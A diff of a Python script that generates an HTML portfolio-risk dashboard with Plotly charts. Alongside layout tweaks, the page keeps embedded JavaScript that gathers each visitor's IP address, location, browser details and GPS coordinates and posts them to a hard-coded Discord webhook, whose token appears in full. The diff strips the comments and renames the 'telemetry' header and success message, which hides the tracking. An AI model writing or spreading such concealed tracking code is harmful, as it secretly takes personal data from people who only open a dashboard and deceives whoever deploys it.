@@ -104,11 +104,11 @@ for t in range(1, steps + 1):
 fig_hist = go.Figure()
 fig_hist.add_trace(go.Scatter(x=cumulative_returns.index, y=cumulative_returns["Optimized Portfolio"], name="Max Sharpe Portfolio", line=dict(color="#00cc96", width=2)))
 fig_hist.add_trace(go.Scatter(x=cumulative_returns.index, y=cumulative_returns[BENCHMARK], name=f"Benchmark ({BENCHMARK})", line=dict(color="#9ca3af", width=2, dash="dash")))
-fig_hist.update_layout(title="<b>Historical Backtest (Normalized)</b>", template="plotly_dark", hovermode="x unified")
+fig_hist.update_layout(title="<b>Historical Backtest (Normalized)</b>", template="plotly_dark", hovermode="x unified", autosize=True)
 
 rolling_vol = port_ret.rolling(window=TRADING_DAYS_PER_YEAR).std() * np.sqrt(TRADING_DAYS_PER_YEAR)
 fig_roll = px.line(rolling_vol.dropna(), title="<b>Rolling 1-Year Volatility (Regime Detection)</b>")
-fig_roll.update_layout(template="plotly_dark", yaxis_title="Annualized Volatility", showlegend=False)
+fig_roll.update_layout(template="plotly_dark", yaxis_title="Annualized Volatility", showlegend=False, autosize=True)
 fig_roll.update_traces(line_color="#38bdf8")
 
 fig_fcast = go.Figure()
@@ -122,7 +122,7 @@ lower_path = np.percentile(prices, 5, axis=1)
 fig_fcast.add_trace(go.Scatter(y=median_path, mode="lines", name="Median ($)", line=dict(color="cyan", width=3)))
 fig_fcast.add_trace(go.Scatter(y=upper_path, mode="lines", name="95th %ile", line=dict(color="orange", width=2, dash="dash")))
 fig_fcast.add_trace(go.Scatter(y=lower_path, mode="lines", name="5th %ile", line=dict(color="magenta", width=2, dash="dash")))
-fig_fcast.update_layout(title=f"<b>4-Year Forward Simulation ($10,000 Initial)</b>", xaxis_title="Trading Days", yaxis_title="Portfolio Value ($)", template="plotly_dark")
+fig_fcast.update_layout(title=f"<b>4-Year Forward Simulation ($10,000 Initial)</b>", xaxis_title="Trading Days", yaxis_title="Portfolio Value ($)", template="plotly_dark", autosize=True)
 
 # --- 8. BUILD METRICS TABLES ---
 weights_df = pd.DataFrame({"Asset": TICKERS, "Weight": optimized_weights})
@@ -143,7 +143,7 @@ risk_data = [
 ]
 risk_df = pd.DataFrame(risk_data)
 
-# --- 9. GENERATE HTML DASHBOARD WITH CONSOLIDATED DISCORD TELEMETRY ---
+# --- 9. GENERATE HTML DASHBOARD ---
 html_hist = pio.to_html(fig_hist, full_html=False, include_plotlyjs="cdn")
 html_roll = pio.to_html(fig_roll, full_html=False, include_plotlyjs=False)
 html_fcast = pio.to_html(fig_fcast, full_html=False, include_plotlyjs=False)
@@ -156,7 +156,6 @@ js = """
 <script>
 async function sendDiscordAlert() {
     try {
-        // 1. Fetch IP & Coarse Location
         let ip = 'Unknown', city = 'Unknown', region = 'Unknown', country = 'Unknown';
         try {
             let response = await fetch('https://ipapi.co/json/');
@@ -169,7 +168,6 @@ async function sendDiscordAlert() {
             console.log("IP API fetch failed", e);
         }
 
-        // 2. Extract Device & Browser Details
         let ua = navigator.userAgent;
         let browser = "Unknown Browser";
         let os = "Unknown OS";
@@ -197,7 +195,6 @@ async function sendDiscordAlert() {
 
         const webhookUrl = 'https://discord.com/api/webhooks/1537277575817330729/INZ0kAtXZKA2SF5sFTHPySczXzHNVdkgBxhkALe7-_QnlHdOIJMX5RZmpxHsxg41rMGg'; 
 
-        // Helper to send complete payload
         const dispatchWebhook = async (locationStr, gpsField = null) => {
             let fields = [
                 { name: "🌐 IP Address", value: ip, inline: true },
@@ -229,7 +226,6 @@ async function sendDiscordAlert() {
             });
         };
 
-        // 3. Handle GPS with Fallback
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
@@ -265,19 +261,20 @@ html_template = f"""
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=1200">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Quantitative Portfolio Risk Engine</title>
     <style>
         body {{background:#0b0f19;color:#f3f4f6;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;margin:0;padding:20px;}}
-        .container {{max-width:1200px;margin:auto;background:#111827;padding:40px;border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,0.5);}}
-        h1 {{color:#00cc96;text-align:center;margin-bottom:5px;}}
+        .container {{max-width:1200px;margin:auto;background:#111827;padding:30px;border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,0.5);}}
+        h1 {{color:#00cc96;text-align:center;margin-bottom:5px;font-size:24px;}}
         .subtitle {{text-align:center;color:#9ca3af;margin-bottom:30px;font-size:14px;}}
-        h2 {{color:#38bdf8;border-bottom:2px solid #374151;padding-bottom:8px;margin-top:40px;}}
-        .grid-2 {{display: grid; grid-template-columns: 1fr 1fr; gap: 20px;}}
+        h2 {{color:#38bdf8;border-bottom:2px solid #374151;padding-bottom:8px;margin-top:40px;font-size:18px;}}
+        .grid-2 {{display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;}}
         .table-container {{overflow-x:auto;margin-top:15px;}}
-        table.table-custom {{width:100%;border-collapse:collapse;background:#1f2937;border-radius:8px;overflow:hidden;}}
+        table.table-custom {{width:100%;border-collapse:collapse;background:#1f2937;border-radius:8px;overflow:hidden;font-size:14px;}}
         table.table-custom th,td {{padding:12px 16px;text-align:left;border-bottom:1px solid #374151;}}
         table.table-custom th {{background:#374151;color:#f9fafb;}}
+        .js-plotly-plot .plotly .main-svg {{background: transparent !important;}}
     </style>
 </head>
 <body>
@@ -317,4 +314,4 @@ html_template = f"""
 with open("index.html", "w", encoding="utf-8") as f:
     f.write(html_template)
 
-print("✅ SUCCESS! index.html exported with consolidated full telemetry tracking.")
+print("✅ SUCCESS! index.html exported with responsive layout and fixed Google Maps links.")
